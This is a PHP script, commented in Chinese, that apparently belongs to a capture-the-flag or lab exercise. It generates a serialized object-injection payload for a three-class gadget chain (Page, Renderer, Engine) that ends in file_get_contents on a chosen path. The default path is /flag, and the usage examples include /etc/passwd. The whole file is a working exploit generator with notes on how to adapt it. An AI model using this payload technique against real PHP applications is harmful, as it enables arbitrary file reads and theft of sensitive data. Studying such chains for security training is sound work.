<?php
/**
 * L2 payload 生成器
 *
 * 核心思路：序列化只关心「类名 + 属性名 + 属性值」，方法体有没有、写的什么，
 * 完全不影响 serialize() 的输出。所以本地复现目标类时，只需要把属性声明出来。
 *
 * 这么做的好处：
 *   1. 不用手数字节长度（少打一个字符就整串作废）
 *   2. 嵌套结构交给 PHP 自己拼，不会漏分号
 *   3. 想换文件路径 / 换命令，改一行再跑一次
 *
 * 运行（容器内）：
 *   docker exec deser-php php /poc/gen_l2.php
 *   docker exec deser-php php /poc/gen_l2.php /etc/passwd
 */

// ---- 复现目标结构：只写属性，不写任何方法 ----
class Page
{
    public $title;
    public $renderer;
}

class Renderer
{
    public $engine;
}

class Engine
{
    public $tpl;
    public $vars;
}

$target = $argv[1] ?? '/flag';

// 从最里层开始造，一层层往外套
$engine = new Engine();
$engine->tpl  = $target;   // 第三跳的 sink：file_get_contents($tpl)
$engine->vars = [];

$renderer = new Renderer();
$renderer->engine = $engine;   // 必须是对象，才会触发 __toString

$page = new Page();
$page->title    = 'home';
$page->renderer = $renderer;   // 必须是 Renderer 实例，否则 __destruct 里 instanceof 不通过

echo serialize($page), PHP_EOL;
